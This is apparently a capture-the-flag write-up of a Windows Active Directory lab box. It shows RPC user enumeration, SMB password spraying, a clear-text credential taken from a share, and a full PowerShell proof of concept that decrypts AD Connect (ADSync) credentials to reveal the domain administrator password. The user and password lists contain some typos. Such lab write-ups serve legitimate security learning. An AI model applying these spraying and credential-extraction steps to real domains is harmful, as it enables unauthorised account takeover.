#box #sqlcmd #password-spraying #mutations #ADSync

>* Compose the password lists with the found usernames and with common wordlist samples like seasons or keywords like passwords.
>* Mutate the password list with `best64.rule` from hashcat

## Nmap

```bash
# Nmap 7.95 scan initiated Mon Sep  8 06:31:28 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.33.15
Nmap scan report for 10.129.33.15
Host is up (0.044s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-08 10:31:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-08T10:31:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  8 06:32:20 2025 -- 1 IP address (1 host up) scanned in 51.89 seconds
```
## RPC

We discover we have access to RPC with the guest user which is in general a really bad practice and moreover we can also use `enumdomusers` to enumerate the existing users in the domain. From it, we extract a list of users:

```bash
rpcclient -U "%" 10.129.33.15 
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

```bash title:"users.txt"
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netappa
dgalanosa
rolearya
smorgana
```

We then create a list of passwords, the initial passwords will be the same usernames with the addition of season and "password":

```bash title:"passwords.lst"
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netappa
dgalanosa
rolearya
smorgana
spring
summer
autumn
winter
password
```

Lastly, we perform a bruteforce attack over SMB discovering a new set of credentials:

```bash
nxc smb megabank.local -u users.txt -p pass.lst
SMB         MEGABANK.LOCAL  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

Obtaining our initial foothold `SABatchJobs:SABatchJobs`.

## SMB

Accessing SMB, we realize we can read different shares, but in particular the `users$` share hides something significant inside, a file called `azure.xml`. We opt to get this file with `smbclient`:

```bash
smbclient -U "MEGABANK.LOCAL/SABatchJobs" //MEGABANK.LOCAL/users$ -c 'cd mhope;get azure.xml'
```

Once obtained, we open it, discovering the presence of a clear-text password, supposedly for the user `mhope` since it was inside its folder in the share.
We proceed to test it out over SMB or WinRM, obtaining the second foothold in the system. Obtaining the credentials: `mhope:4n0therD4y@n0th3r$`. The latter, can now also connect over WinRM.

## Internal Reconnaissance WinRM

Once logged in on WinRM we validate the presence of a machine with an Azure instance on it. Precisely, a db instance is on the foothold machine. The machine has a SQL Instance in it, so we opt for trying to connect with our user with `sqlcmd`. Unfortunately, we're unable to get an interactive shell, so we'll proceed with input commands with the flag `-Q`:

```bash
sqlcmd -Q "select * from master.dbo.sysdatabases;"
```

By doing that command, we discover the presence of the usual DBs and a peculiar one, `ADSync`.
We then opt to explore what's inside `ADSync` with:

```bash
sqlcmd -Q "select * from ADSync.information_schema.tables;"
```

Two tables feels to be outstanding in terms of value compared to the others: `mms_server_configuration` and `mms_management_agent`. We opt to lurk what's inside of those tables and we notice the presence of some encrypted credentials.

```bash
sqlcmd -Q "select * from ADSync.dbo.mms_server_configuration"
sqlcmd -Q "select * from ADSync.dbo.mms_management_agent"
```

However, nothing in particular clicks by looking at those data, so we opt for looking on the internet what those tables are and what ADSync is and how it can be used to privilege escalation.
By doing so, we end up in [this](https://blog.xpnsec.com/azuread-connect-for-redteam/) blog post. The researcher found a way to decrypt the encrypted information listed in the `server_configuration` table. To do so, we can either perform the powershell command script one step at a time or we can eventually upload the script on the target machine, change the connection string and run it:
We download the script and change the connection string from `Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync` to `Data Source=localhost;Integrated Security=true;Initial Catalog=ADSync`:

```bash
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

# $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost;Integrated Security=true;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

and we then run it, obtaining the encrypted password for the administrator:

```bash
./decrypt.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
